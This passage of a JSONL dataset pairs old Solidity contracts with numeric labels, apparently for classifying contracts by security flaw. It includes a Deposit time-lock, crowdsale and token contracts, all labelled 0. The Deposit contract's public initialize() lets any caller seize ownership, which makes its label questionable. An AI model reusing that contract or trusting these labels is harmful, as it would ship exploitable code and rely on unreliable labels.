}\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.15;\r\r\n\r\r\ncontract Deposit {\r\r\n    address public Owner;\r\r\n    \r\r\n    mapping (address => uint) public deposits;\r\r\n    \r\r\n    uint public ReleaseDate;\r\r\n    bool public Locked;\r\r\n    \r\r\n    event Initialized();\r\r\n    event Deposit(uint Amount);\r\r\n    event Withdrawal(uint Amount);\r\r\n    event ReleaseDate(uint date);\r\r\n    \r\r\n    function initialize() payable {\r\r\n        Owner = msg.sender;\r\r\n        ReleaseDate = 0;\r\r\n        Locked = false;\r\r\n        Initialized();\r\r\n    }\r\r\n\r\r\n    function setReleaseDate(uint date) public payable {\r\r\n        if (isOwner() && !Locked) {\r\r\n            ReleaseDate = date;\r\r\n            Locked = true;\r\r\n            ReleaseDate(date);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function() payable { revert(); } \/\/ call deposit()\r\r\n    \r\r\n    function deposit() public payable {\r\r\n        if (msg.value >= 0.25 ether) {\r\r\n            deposits[msg.sender] += msg.value;\r\r\n            Deposit(msg.value);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function withdraw(uint amount) public payable {\r\r\n        withdrawTo(msg.sender, amount);\r\r\n    }\r\r\n    \r\r\n    function withdrawTo(address to, uint amount) public payable {\r\r\n        if (isOwner() && isReleasable()) {\r\r\n            uint withdrawMax = deposits[msg.sender];\r\r\n            if (withdrawMax > 0 && amount <= withdrawMax) {\r\r\n                to.transfer(amount);\r\r\n                Withdrawal(amount);\r\r\n            }\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function isReleasable() public constant returns (bool) { return now >= ReleaseDate; }\r\r\n    function isOwner() public constant returns (bool) { return Owner == msg.sender; }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n  uint256 public totalSupply;\r\r\n  function balanceOf(address who) constant returns (uint256);\r\r\n  function transfer(address to, uint256 value) returns (bool);\r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    require(newOwner != address(0));      \r\r\n    owner = newOwner;\r\r\n  }\r\r\n}\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\/**\r\r\n * @title Crowdsale \r\r\n * @dev Crowdsale is a base contract for managing a token crowdsale.\r\r\n * Crowdsales have a start and end timestamps, where investors can make\r\r\n * token purchases and the crowdsale will assign them tokens based\r\r\n * on a token per ETH rate. Funds collected are forwarded to a wallet \r\r\n * as they arrive.\r\r\n *\/\r\r\ncontract Crowdsale {\r\r\n  using SafeMath for uint256;\r\r\n  \/\/ The token being sold\r\r\n  MintableToken public token;\r\r\n  \/\/ start and end timestamps where investments are allowed (both inclusive)\r\r\n  uint256 public startTime;\r\r\n  uint256 public endTime;\r\r\n  \/\/ address where funds are collected\r\r\n  address public wallet;\r\r\n  \/\/ how many token units a buyer gets per wei\r\r\n  uint256 public rate;\r\r\n  \/\/ amount of raised money in wei\r\r\n  uint256 public weiRaised;\r\r\n  \/**\r\r\n   * event for token purchase logging\r\r\n   * @param purchaser who paid for the tokens\r\r\n   * @param beneficiary who got the tokens\r\r\n   * @param value weis paid for purchase\r\r\n   * @param amount amount of tokens purchased\r\r\n   *\/ \r\r\n  event TokenPurchase(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);\r\r\n  function Crowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) {\r\r\n    require(_startTime >= now);\r\r\n    require(_endTime >= _startTime);\r\r\n    require(_rate > 0);\r\r\n    require(_wallet != 0x0);\r\r\n    token = createTokenContract();\r\r\n    startTime = _startTime;\r\r\n    endTime = _endTime;\r\r\n    rate = _rate;\r\r\n    wallet = _wallet;\r\r\n  }\r\r\n  \/\/ creates the token to be sold. \r\r\n  \/\/ override this method to have crowdsale of a specific mintable token.\r\r\n  function createTokenContract() internal returns (MintableToken) {\r\r\n    return new MintableToken();\r\r\n  }\r\r\n  \/\/ fallback function can be used to buy tokens\r\r\n  function () payable {\r\r\n    buyTokens(msg.sender);\r\r\n  }\r\r\n  \/\/ low level token purchase function\r\r\n  function buyTokens(address beneficiary) payable {\r\r\n    require(beneficiary != 0x0);\r\r\n    require(validPurchase());\r\r\n    uint256 weiAmount = msg.value;\r\r\n    \/\/ calculate token amount to be created\r\r\n    uint256 tokens = weiAmount.mul(rate);\r\r\n    \/\/ update state\r\r\n    weiRaised = weiRaised.add(weiAmount);\r\r\n    token.mint(beneficiary, tokens);\r\r\n    TokenPurchase(msg.sender, beneficiary, weiAmount, tokens);\r\r\n    forwardFunds();\r\r\n  }\r\r\n  \/\/ send ether to the fund collection wallet\r\r\n  \/\/ override to create custom fund forwarding mechanisms\r\r\n  function forwardFunds() internal {\r\r\n    wallet.transfer(msg.value);\r\r\n  }\r\r\n  \/\/ @return true if the transaction can buy tokens\r\r\n  function validPurchase() internal constant returns (bool) {\r\r\n    bool withinPeriod = now >= startTime && now <= endTime;\r\r\n    bool nonZeroPurchase = msg.value != 0;\r\r\n    return withinPeriod && nonZeroPurchase;\r\r\n  }\r\r\n  \/\/ @return true if crowdsale event has ended\r\r\n  function hasEnded() public constant returns (bool) {\r\r\n    return now > endTime;\r\r\n  }\r\r\n}\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances. \r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n  using SafeMath for uint256;\r\r\n  mapping(address => uint256) balances;\r\r\n  \/**\r\r\n  * @dev transfer token for a specified address\r\r\n  * @param _to The address to transfer to.\r\r\n  * @param _value The amount to be transferred.\r\r\n  *\/\r\r\n  function transfer(address _to, uint256 _value) returns (bool) {\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n  \/**\r\r\n  * @dev Gets the balance of the specified address.\r\r\n  * @param _owner The address to query the the balance of. \r\r\n  * @return An uint256 representing the amount owned by the passed address.\r\r\n  *\/\r\r\n  function balanceOf(address _owner) constant returns (uint256 balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n}\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n  function allowance(address owner, address spender) constant returns (uint256);\r\r\n  function transferFrom(address from, address to, uint256 value) returns (bool);\r\r\n  function approve(address spender, uint256 value) returns (bool);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n  mapping (address => mapping (address => uint256)) allowed;\r\r\n  \/**\r\r\n   * @dev Transfer tokens from one address to another\r\r\n   * @param _from address The address which you want to send tokens from\r\r\n   * @param _to address The address which you want to transfer to\r\r\n   * @param _value uint256 the amout of tokens to be transfered\r\r\n   *\/\r\r\n  function transferFrom(address _from, address _to, uint256 _value) returns (bool) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n    \/\/ Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\r\r\n    \/\/ require (_value <= _allowance);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n  \/**\r\r\n   * @dev Aprove the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) returns (bool) {\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    require((_value == 0) || (allowed[msg.sender][_spender] == 0));\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifing the amount of tokens still available for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n}\r\r\n\/**\r\r\n * @title Mintable token\r\r\n * @dev Simple ERC20 Token example, with mintable token creation\r\r\n * @dev Issue: * https:\/\/github.com\/OpenZeppelin\/zeppelin-solidity\/issues\/120\r\r\n * Based on code by TokenMarketNet: https:\/\/github.com\/TokenMarketNet\/ico\/blob\/master\/contracts\/MintableToken.sol\r\r\n *\/\r\r\ncontract MintableToken is StandardToken, Ownable {\r\r\n  event Mint(address indexed to, uint256 amount);\r\r\n  event MintFinished();\r\r\n  bool public mintingFinished = false;\r\r\n  modifier canMint() {\r\r\n    require(!mintingFinished);\r\r\n    _;\r\r\n  }\r\r\n  \/**\r\r\n   * @dev Function to mint tokens\r\r\n   * @param _to The address that will recieve the minted tokens.\r\r\n   * @param _amount The amount of tokens to mint.\r\r\n   * @return A boolean that indicates if the operation was successful.\r\r\n   *\/\r\r\n  function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {\r\r\n    totalSupply = totalSupply.add(_amount);\r\r\n    balances[_to] = balances[_to].add(_amount);\r\r\n    Mint(_to, _amount);\r\r\n    Transfer(0x0, _to, _amount);\r\r\n    return true;\r\r\n  }\r\r\n  \/**\r\r\n   * @dev Function to stop minting new tokens.\r\r\n   * @return True if the operation was successful.\r\r\n   *\/\r\r\n  function finishMinting() onlyOwner returns (bool) {\r\r\n    mintingFinished = true;\r\r\n    MintFinished();\r\r\n    return true;\r\r\n  }\r\r\n}\r\r\ncontract EverhuskToken is MintableToken {\r\r\n    string public constant name = \"EverhuskToken\";\r\r\n    string public constant symbol = \"SUKH\";\r\r\n    uint8 public constant decimals = 18;\r\r\n}\r\r\ncontract EverhuskCrowdsale is Crowdsale {\r\r\n    function EverhuskCrowdsale(uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet) \r\r\n        Crowdsale(_startTime, _endTime, _rate, _wallet)\r\r\n    {\r\r\n    }\r\r\n    function createTokenContract() internal returns (MintableToken) {\r\r\n        return new EverhuskToken();\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.11;\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 {\r\r\n\r\r\n  uint256 public totalSupply;\r\r\n\r\r\n  function balanceOf(address who) constant returns (uint256);\r\r\n  function transfer(address to, uint256 value) returns (bool);\r\r\n  function transferFrom(address from, address to, uint256 value) returns (bool);\r\r\n  function approve(address spender, uint256 value) returns (bool);\r\r\n  function allowance(address owner, address spender) constant returns (uint256);\r\r\n  \r\r\n  event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n  event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n  function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a * b;\r\r\n    assert(a == 0 || c \/ a == b);\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n    uint256 c = a \/ b;\r\r\n    \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n    return c;\r\r\n  }\r\r\n\r\r\n  function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    assert(b <= a);\r\r\n    return a - b;\r\r\n  }\r\r\n\r\r\n  function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n    uint256 c = a + b;\r\r\n    assert(c >= a);\r\r\n    return c;\r\r\n  }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n  address public owner;\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n   * account.\r\r\n   *\/\r\r\n  function Ownable() {\r\r\n    owner = msg.sender;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Throws if called by any account other than the owner.\r\r\n   *\/\r\r\n  modifier onlyOwner() {\r\r\n    require(msg.sender == owner);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n\r\r\n  \/**\r\r\n   * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n   * @param newOwner The address to transfer ownership to.\r\r\n   *\/\r\r\n  function transferOwnership(address newOwner) onlyOwner {\r\r\n    if (newOwner != address(0)) {\r\r\n      owner = newOwner;\r\r\n    }\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\n\/**\r\r\n * Standard ERC20 token\r\r\n *\r\r\n * https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * Based on code by FirstBlood:\r\r\n * https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\n\r\r\n\/\/\/ @title Proof Presale Token (PROOFP)\r\r\n\r\r\ncontract ProofPresaleToken is ERC20, Ownable {\r\r\n\r\r\n  using SafeMath for uint256;\r\r\n\r\r\n  mapping(address => uint) balances;\r\r\n  mapping (address => mapping (address => uint)) allowed;\r\r\n\r\r\n  string public name = \"Proof Presale Token\";\r\r\n  string public symbol = \"PROOFP\";\r\r\n  uint8 public decimals = 18;\r\r\n  bool public mintingFinished = false;\r\r\n\r\r\n  event Mint(address indexed to, uint256 amount);\r\r\n  event MintFinished();\r\r\n\r\r\n  function ProofPresaleToken() {}\r\r\n\r\r\n\r\r\n  \/\/ TODO : need to replace throw by 0.4.11 solidity compiler syntax\r\r\n  function() payable {\r\r\n    revert();\r\r\n  }\r\r\n\r\r\n  function transfer(address _to, uint _value) returns (bool success) {\r\r\n\r\r\n    balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n\r\r\n    Transfer(msg.sender, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function transferFrom(address _from, address _to, uint _value) returns (bool success) {\r\r\n    var _allowance = allowed[_from][msg.sender];\r\r\n\r\r\n    balances[_to] = balances[_to].add(_value);\r\r\n    balances[_from] = balances[_from].sub(_value);\r\r\n    allowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n\r\r\n    Transfer(_from, _to, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function balanceOf(address _owner) constant returns (uint balance) {\r\r\n    return balances[_owner];\r\r\n  }\r\r\n\r\r\n  function approve(address _spender, uint _value) returns (bool success) {\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  function allowance(address _owner, address _spender) constant returns (uint remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n    \r\r\n    \r\r\n  modifier canMint() {\r\r\n    require(!mintingFinished);\r\r\n    _;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * Function to mint tokens\r\r\n   * @param _to The address that will recieve the minted tokens.\r\r\n   * @param _amount The amount of tokens to mint.\r\r\n   * @return A boolean that indicates if the operation was successful.\r\r\n   *\/\r\r\n\r\r\n  function mint(address _to, uint256 _amount) onlyOwner canMint returns (bool) {\r\r\n    totalSupply = totalSupply.add(_amount);\r\r\n    balances[_to] = balances[_to].add(_amount);\r\r\n    Mint(_to, _amount);\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to stop minting new tokens.\r\r\n   * @return True if the operation was successful.\r\r\n   *\/\r\r\n  function finishMinting() onlyOwner returns (bool) {\r\r\n    mintingFinished = true;\r\r\n    MintFinished();\r\r\n    return true;\r\r\n  }\r\r\n\r\r\n  \r\r\n  \r\r\n}","label":0}
{"code":"pragma solidity >=0.4.4;\r\r\n\r\r\n\/\/from Zeppelin\r\r\ncontract SafeMath {\r\r\n    function safeMul(uint a, uint b) internal returns (uint) {\r\r\n        uint c = a * b;\r\r\n        assert(a == 0 || c \/ a == b);\r\r\n        return c;\r\r\n    }\r\r\n\r\r\n    function safeSub(uint a, uint b) internal returns (uint) {\r\r\n        assert(b <= a);\r\r\n        return a - b;\r\r\n    }\r\r\n\r\r\n    function safeAdd(uint a, uint b) internal returns (uint) {\r\r\n        uint c = a + b;\r\r\n        assert(c>=a && c>=b);\r\r\n        return c;\r\r\n    }\r\r\n\r\r\n    function assert(bool assertion) internal {\r\r\n        if (!assertion) throw;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Owned {\r\r\n    address public owner;\r\r\n\r\r\n    function Owned() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    modifier onlyOwner() {\r\r\n        if (msg.sender != owner) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    address newOwner;\r\r\n\r\r\n    function changeOwner(address _newOwner) onlyOwner {\r\r\n        newOwner = _newOwner;\r\r\n    }\r\r\n\r\r\n    function acceptOwnership() {\r\r\n        if (msg.sender == newOwner) {\r\r\n            owner = newOwner;\r\r\n        }\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Finalizable is Owned {\r\r\n    bool public finalized;\r\r\n\r\r\n    function finalize() onlyOwner {\r\r\n        finalized = true;\r\r\n    }\r\r\n\r\r\n    modifier notFinalized() {\r\r\n        if (finalized) throw;\r\r\n        _;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract IToken {\r\r\n    function transfer(address _to, uint _value) returns (bool);\r\r\n    function balanceOf(address owner) returns(uint);\r\r\n}\r\r\n\r\r\ncontract TokenReceivable is Owned {\r\r\n    event logTokenTransfer(address token, address to, uint amount);\r\r\n\r\r\n    function claimTokens(address _token, address _to) onlyOwner returns (bool) {\r\r\n        IToken token = IToken(_token);\r\r\n        uint balance = token.balanceOf(this);\r\r\n        if (token.transfer(_to, balance)) {\r\r\n            logTokenTransfer(_token, _to, balance);\r\r\n            return true;\r\r\n        }\r\r\n        return false;\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract EventDefinitions {\r\r\n    event Transfer(address indexed from, address indexed to, uint value);\r\r\n    event Approval(address indexed owner, address indexed spender, uint value);\r\r\n}\r\r\n\r\r\ncontract Token is Finalizable, TokenReceivable, SafeMath, EventDefinitions {\r\r\n\r\r\n    string public name = \"FunFair\";\r\r\n    uint8 public decimals = 8;\r\r\n    string public symbol = \"FUN\";\r\r\n\r\r\n    Controller controller;\r\r\n    address owner;\r\r\n\r\r\n    function setController(address _c) onlyOwner notFinalized {\r\r\n        controller = Controller(_c);\r\r\n    }\r\r\n\r\r\n    function balanceOf(address a) constant returns (uint) {\r\r\n        return controller.balanceOf(a);\r\r\n    }\r\r\n\r\r\n    function totalSupply() constant returns (uint) {\r\r\n        return controller.totalSupply();\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender) constant returns (uint) {\r\r\n        return controller.allowance(_owner, _spender);\r\r\n    }\r\r\n\r\r\n    function transfer(address _to, uint _value)\r\r\n    onlyPayloadSize(2)\r\r\n    returns (bool success) {\r\r\n       success = controller.transfer(msg.sender, _to, _value);\r\r\n        if (success) {\r\r\n            Transfer(msg.sender, _to, _value);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint _value)\r\r\n    onlyPayloadSize(3)\r\r\n    returns (bool success) {\r\r\n       success = controller.transferFrom(msg.sender, _from, _to, _value);\r\r\n        if (success) {\r\r\n            Transfer(_from, _to, _value);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function approve(address _spender, uint _value)\r\r\n    onlyPayloadSize(2)\r\r\n    returns (bool success) {\r\r\n        \/\/promote safe user behavior\r\r\n        if (controller.allowance(msg.sender, _spender) > 0) throw;\r\r\n\r\r\n        success = controller.approve(msg.sender, _spender, _value);\r\r\n        if (success) {\r\r\n            Approval(msg.sender, _spender, _value);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function increaseApproval (address _spender, uint _addedValue)\r\r\n    onlyPayloadSize(2)\r\r\n    returns (bool success) {\r\r\n        success = controller.increaseApproval(msg.sender, _spender, _addedValue);\r\r\n        if (success) {\r\r\n            uint newval = controller.allowance(msg.sender, _spender);\r\r\n            Approval(msg.sender, _spender, newval);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function decreaseApproval (address _spender, uint _subtractedValue)\r\r\n    onlyPayloadSize(2)\r\r\n    returns (bool success) {\r\r\n        success = controller.decreaseApproval(msg.sender, _spender, _subtractedValue);\r\r\n        if (success) {\r\r\n            uint newval = controller.allowance(msg.sender, _spender);\r\r\n            Approval(msg.sender, _spender, newval);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    modifier onlyPayloadSize(uint numwords) {\r\r\n    assert(msg.data.length == numwords * 32 + 4);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\ncontract Controller is Owned, Finalizable {\r\r\n    Ledger public ledger;\r\r\n    address public token;\r\r\n\r\r\n    function setToken(address _token) onlyOwner {\r\r\n        token = _token;\r\r\n    }\r\r\n\r\r\n    function setLedger(address _ledger) onlyOwner {\r\r\n        ledger = Ledger(_ledger);\r\r\n    }\r\r\n\r\r\n    modifier onlyToken() {\r\r\n        if (msg.sender != token) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function totalSupply() constant returns (uint) {\r\r\n        return ledger.totalSupply();\r\r\n    }\r\r\n\r\r\n    function balanceOf(address _a) onlyToken constant returns (uint) {\r\r\n        return Ledger(ledger).balanceOf(_a);\r\r\n    }\r\r\n\r\r\n    function allowance(address _owner, address _spender)\r\r\n    onlyToken constant returns (uint) {\r\r\n        return ledger.allowance(_owner, _spender);\r\r\n    }\r\r\n\r\r\n    function transfer(address _from, address _to, uint _value)\r\r\n    onlyToken\r\r\n    returns (bool success) {\r\r\n        return ledger.transfer(_from, _to, _value);\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _spender, address _from, address _to, uint _value)\r\r\n    onlyToken\r\r\n    returns (bool success) {\r\r\n        return ledger.transferFrom(_spender, _from, _to, _value);\r\r\n    }\r\r\n\r\r\n    function approve(address _owner, address _spender, uint _value)\r\r\n    onlyToken\r\r\n    returns (bool success) {\r\r\n        return ledger.approve(_owner, _spender, _value);\r\r\n    }\r\r\n\r\r\n    function increaseApproval (address _owner, address _spender, uint _addedValue)\r\r\n    onlyToken\r\r\n    returns (bool success) {\r\r\n        return ledger.increaseApproval(_owner, _spender, _addedValue);\r\r\n    }\r\r\n\r\r\n    function decreaseApproval (address _owner, address _spender, uint _subtractedValue)\r\r\n    onlyToken\r\r\n    returns (bool success) {\r\r\n        return ledger.decreaseApproval(_owner, _spender, _subtractedValue);\r\r\n    }\r\r\n}\r\r\n\r\r\ncontract Ledger is Owned, SafeMath, Finalizable {\r\r\n    address public controller;\r\r\n    mapping(address => uint) public balanceOf;\r\r\n    mapping (address => mapping (address => uint)) public allowance;\r\r\n    uint public totalSupply;\r\r\n\r\r\n    function setController(address _controller) onlyOwner notFinalized {\r\r\n        controller = _controller;\r\r\n    }\r\r\n\r\r\n    modifier onlyController() {\r\r\n        if (msg.sender != controller) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function transfer(address _from, address _to, uint _value)\r\r\n    onlyController\r\r\n    returns (bool success) {\r\r\n        if (balanceOf[_from] < _value) return false;\r\r\n\r\r\n        balanceOf[_from] = safeSub(balanceOf[_from], _value);\r\r\n        balanceOf[_to] = safeAdd(balanceOf[_to], _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _spender, address _from, address _to, uint _value)\r\r\n    onlyController\r\r\n    returns (bool success) {\r\r\n        if (balanceOf[_from] < _value) return false;\r\r\n\r\r\n        var allowed = allowance[_from][_spender];\r\r\n        if (allowed < _value) return false;\r\r\n\r\r\n        balanceOf[_to] = safeAdd(balanceOf[_to], _value);\r\r\n        balanceOf[_from] = safeSub(balanceOf[_from], _value);\r\r\n        allowance[_from][_spender] = safeSub(allowed, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function approve(address _owner, address _spender, uint _value)\r\r\n    onlyController\r\r\n    returns (bool success) {\r\r\n        \/\/require user to set to zero before resetting to nonzero\r\r\n        if ((_value != 0) && (allowance[_owner][_spender] != 0)) {\r\r\n            return false;\r\r\n        }\r\r\n\r\r\n        allowance[_owner][_spender] = _value;\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function increaseApproval (address _owner, address _spender, uint _addedValue)\r\r\n    onlyController\r\r\n    returns (bool success) {\r\r\n        uint oldValue = allowance[_owner][_spender];\r\r\n        allowance[_owner][_spender] = safeAdd(oldValue, _addedValue);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function decreaseApproval (address _owner, address _spender, uint _subtractedValue)\r\r\n    onlyController\r\r\n    returns (bool success) {\r\r\n        uint oldValue = allowance[_owner][_spender];\r\r\n        if (_subtractedValue > oldValue) {\r\r\n            allowance[_owner][_spender] = 0;\r\r\n        } else {\r\r\n            allowance[_owner][_spender] = safeSub(oldValue, _subtractedValue);\r\r\n        }\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function mint(address _a, uint _amount) onlyOwner notFinalized {\r\r\n        balanceOf[_a] = safeAdd(balanceOf[_a], _amount);\r\r\n        totalSupply = safeAdd(totalSupply, _amount);\r\r\n    }\r\r\n\r\r\n    function multiMint(uint[] bits) onlyOwner notFinalized {\r\r\n        for (uint i=0; i<bits.length; i++) {\r\r\n\t    address a = address(bits[i]>>96);\r\r\n\t    uint amount = bits[i]&((1<<96) - 1);\r\r\n\t    mint(a, amount);\r\r\n        }\r\r\n    }\r\r\n}","label":0}
